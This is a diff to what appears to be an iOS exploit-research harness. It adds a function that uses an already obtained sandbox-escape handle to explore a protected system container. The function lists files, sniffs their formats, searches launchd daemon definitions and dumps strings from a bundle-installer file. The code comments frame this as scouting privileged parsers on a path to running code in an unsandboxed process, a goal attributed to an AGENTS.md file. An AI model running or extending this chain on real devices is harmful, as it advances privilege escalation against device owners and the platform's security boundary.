@@ -25906,6 +25906,242 @@ static void p_bq6(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V175 (p_bq7): reconnaissance of the sefw container — read-only.
+//
+// §175's inventory opened W on two files whose formats are far more
+// interesting than plists: LoadAndInstallBundle_DEFAULT.sefw and
+// com.apple.softposreader.keychain, both in container 7CB67CBE. A bundle
+// INSTALLER and a keychain are exactly the consumers that parse
+// attacker-influenced binary formats in a privileged context — the shape
+// of path from "write a file" to "code in an unsandboxed process" that
+// AGENTS.md names as the intermediate goal. §178 also showed from the bq6
+// diff that this container's files do NOT move on their own (no 7CB67CBE
+// lines in the diff): a passive consumer, which means our write would not
+// be overwritten — but also that observation must come from the consumer's
+// next invocation, not from mtime.
+//
+// Before anything else, facts, not guesses (the rule that §170's metadata
+// listing established): who owns the container, what the files are, what
+// their bytes say, and which launchd daemon mentions these names at all.
+// Every operation below is read or stat — nothing is written, nothing is
+// modified. The only write-free exception: reading is done through the
+// escape handle's extension, as always.
+// ---------------------------------------------------------------------------
+
+static void p_bq7(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq7] v175 sefw container recon (read-only: list / identify / sniff)");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq7] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { return; }
+
+    const char *base = "/var/containers/Data/System/7CB67CBE-31A2-474A-9555-8A0A3B979760";
+
+    // ---- 1. Owner identity: the container's own metadata plist. Guessing
+    // the identifier's filename is exactly what §170 forbade — read the
+    // directory and print what is there, then parse whatever plist exists.
+    {
+        DIR *d = opendir(base);
+        struct dirent *e;
+        LOG("[bq7] top-level listing of %s:", base);
+        while (d && (e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            char p[1024];
+            snprintf(p, sizeof(p), "%s/%s", base, e->d_name);
+            struct stat st;
+            if (stat(p, &st) == 0)
+                LOG("[bq7]   %-52s %10lld %s", e->d_name, (long long)st.st_size,
+                    S_ISDIR(st.st_mode) ? "DIR" : "file");
+        }
+        if (d) closedir(d);
+        fsync(fileno(stderr));
+
+        // Metadata: MCMMetadataIdentifier names the owning daemon/team
+        // (§170's method, applied to this container).
+        char mp[1100];
+        snprintf(mp, sizeof(mp), "%s/.com.apple.mobile_container_manager.metadata.plist", base);
+        NSData *md = [NSData dataWithContentsOfFile:
+            [NSString stringWithUTF8String:mp] options:0 error:nil];
+        if (md.length == 0) {
+            LOG("[bq7] metadata plist unreadable (%zu bytes)", (size_t)md.length);
+        } else {
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                kCFAllocatorDefault, (__bridge CFDataRef)md, 0, NULL, NULL);
+            NSDictionary *dict = pl && [(__bridge id)pl isKindOfClass:[NSDictionary class]]
+                ? (__bridge NSDictionary *)pl : nil;
+            id ident = [dict objectForKey:@"MCMMetadataIdentifier"];
+            LOG("[bq7] metadata: %zu bytes, identifier = %s", (size_t)md.length,
+                ident ? [ident UTF8String] : "(absent)");
+            if (pl) CFRelease(pl);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- 2. Recursive listing with magic-byte sniffing. Files in this
+    // container are the payload; their leading bytes say what parser would
+    // consume them (PK=zip, 0xFEEDFEED-ish=Mach-O/objc, 0x30=ASN.1, SQLite
+    // header, XML/bplist...). Sniff, do not assume: §170's lesson applies
+    // to file formats too.
+    {
+        typedef struct { const char *tag; const uint8_t *magic; size_t n; } sniff_t;
+        static const sniff_t sniffs[] = {
+            { "PK-zip/sefw-bundle", (const uint8_t *)"PK\x03\x04", 4 },
+            { "Mach-O 64", (const uint8_t *)"\xFE\xED\xFA\xCF", 4 },
+            { "Mach-O 64 LE", (const uint8_t *)"\xCF\xFA\xED\xFE", 4 },
+            { "SQLite 3", (const uint8_t *)"SQLite format 3\000", 16 },
+            { "bplist00", (const uint8_t *)"bplist00", 8 },
+            { "ASN.1/DER (0x30)", (const uint8_t *)"\x30", 1 },
+            { "XML <", (const uint8_t *)"<?xml", 5 },
+            { "Apple archive?", (const uint8_t *)"\x68\x73\x74\x73", 4 },
+        };
+        // Stack recursion with a depth cap, printing per-file: path, size,
+        // first 16 bytes hex, and the sniff tag when one matches.
+        char seen[64][1600];
+        int nseen = 0;
+        typedef struct { const char *dir; int depth; } walk_t;
+        walk_t stack[8];
+        int sp = 0;
+        stack[sp++] = (walk_t){ base, 3 };
+        while (sp > 0 && nseen < 60) {
+            walk_t w = stack[--sp];
+            DIR *d = opendir(w.dir);
+            struct dirent *e;
+            while (d && (e = readdir(d)) && nseen < 60) {
+                if (e->d_name[0] == '.') continue;
+                char p[1600];
+                snprintf(p, sizeof(p), "%s/%s", w.dir, e->d_name);
+                struct stat st;
+                if (stat(p, &st) != 0) continue;
+                if (S_ISDIR(st.st_mode) && w.depth > 0 && sp < 8) {
+                    stack[sp++] = (walk_t){ seen[nseen], w.depth - 1 };
+                    snprintf(seen[nseen++], 1600, "%s", p);
+                    continue;
+                }
+                int fd = open(p, O_RDONLY);
+                uint8_t buf[16] = {0};
+                ssize_t r = fd >= 0 ? read(fd, buf, sizeof(buf)) : -1;
+                if (fd >= 0) close(fd);
+                const char *tag = "unknown";
+                for (unsigned i = 0; i < sizeof(sniffs) / sizeof(sniffs[0]); i++)
+                    if (r >= (ssize_t)sniffs[i].n &&
+                        memcmp(buf, sniffs[i].magic, sniffs[i].n) == 0) {
+                        tag = sniffs[i].tag; break;
+                    }
+                LOG("[bq7]   %-96s %9lld  %02x%02x%02x%02x%02x%02x%02x%02x  %s",
+                    p + strlen(base), (long long)st.st_size,
+                    buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7],
+                    tag);
+            }
+            if (d) closedir(d);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- 3. Which daemon works with these names? Every launchd plist is
+    // readable (§175: /System/Library/LaunchDaemons opened). Grep the
+    // daemon definitions for the names we hold — the consumer is named in
+    // its own launchd entry, not guessed from the file format.
+    {
+        static const char *needles[] = { "sefw", "softposreader",
+                                         "LoadAndInstall", "7CB67CBE" };
+        const char *dirs[] = { "/System/Library/LaunchDaemons",
+                               "/System/Library/LaunchAgents",
+                               "/Library/LaunchDaemons" };
+        for (unsigned di = 0; di < 3; di++) {
+            DIR *d = opendir(dirs[di]);
+            if (!d) { LOG("[bq7] %s: opendir errno %d", dirs[di], errno); continue; }
+            struct dirent *e;
+            int files = 0, hits = 0;
+            while ((e = readdir(d))) {
+                if (e->d_name[0] == '.') continue;
+                char p[1024];
+                snprintf(p, sizeof(p), "%s/%s", dirs[di], e->d_name);
+                NSData *dd = [NSData dataWithContentsOfFile:
+                    [NSString stringWithUTF8String:p] options:0 error:nil];
+                if (dd.length == 0) continue;
+                files++;
+                NSString *s = [[NSString alloc] initWithData:dd
+                    encoding:NSUTF8StringEncoding];
+                if (!s) continue;
+                for (unsigned ni = 0; ni < 4; ni++)
+                    if ([s rangeOfString:[NSString stringWithUTF8String:needles[ni]]
+                                 options:NSCaseInsensitiveSearch].location
+                            != NSNotFound) {
+                        LOG("[bq7]   HIT '%s' in %s/%s", needles[ni], dirs[di],
+                            e->d_name);
+                        hits++;
+                        break;
+                    }
+            }
+            closedir(d);
+            LOG("[bq7] %s: %d plists scanned, %d hits", dirs[di], files, hits);
+            fsync(fileno(stderr));
+        }
+    }
+
+    // ---- 4. The consumer's own definition and the payload's strings.
+    // softposreaderd is named by its launchd entry — read what it says it
+    // does (program, entitlements hints in labels), then pull printable
+    // runs from the sefw head: an ASN.1 container usually embeds OIDs and
+    // identifiers in clear text, and those name the format family without
+    // a full DER parse.
+    {
+        NSData *lp = [NSData dataWithContentsOfFile:
+            @"/System/Library/LaunchDaemons/com.apple.softposreaderd.plist"
+            options:0 error:nil];
+        NSString *ls = lp ? [[NSString alloc] initWithData:lp
+            encoding:NSUTF8StringEncoding] : nil;
+        if (ls) {
+            LOG("[bq7] --- com.apple.softposreaderd.plist (%zu bytes) ---",
+                (size_t)lp.length);
+            // Print line by line: launchd plists are small XML, and the
+            // full text is the honest record (no summarizing someone
+            // else's daemon by its filename).
+            for (NSString *line in [ls componentsSeparatedByString:@"\n"])
+                LOG("[bq7]   | %s", line.UTF8String);
+        } else {
+            LOG("[bq7] softposreaderd plist unreadable");
+        }
+        fsync(fileno(stderr));
+
+        int fd = open("/var/containers/Data/System/"
+                      "7CB67CBE-31A2-474A-9555-8A0A3B979760/"
+                      "LoadAndInstallBundle_DEFAULT.sefw", O_RDONLY);
+        if (fd >= 0) {
+            uint8_t *m = mmap(NULL, 574380, PROT_READ, MAP_PRIVATE, fd, 0);
+            close(fd);
+            if (m != MAP_FAILED) {
+                // Printable runs >= 6 chars from the first 64KB — enough to
+                // name the payload family (bundle ids, version strings,
+                // OID descriptions) without dumping the whole 560KB.
+                LOG("[bq7] --- sefw strings (first 64KB, runs >= 6) ---");
+                int shown = 0;
+                char run[128];
+                int rl = 0;
+                for (int i = 0; i < 65536 && shown < 50; i++) {
+                    char c = (char)m[i];
+                    if (c >= 0x20 && c < 0x7f) {
+                        if (rl < 127) run[rl++] = c;
+                    } else {
+                        if (rl >= 6) { run[rl] = 0; LOG("[bq7]   s @%06x: %s", i - rl, run); shown++; }
+                        rl = 0;
+                    }
+                }
+                munmap(m, 574380);
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq7] done");
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -30398,6 +30634,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ6") || getenv("FUZZ_BQ6_FORGET")) {
             p_bq6(); LOG("[probe13] bq6-only mode, stop"); return NULL;
         }
+        if (getenv("FUZZ_BQ7")) { p_bq7(); LOG("[probe13] bq7-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
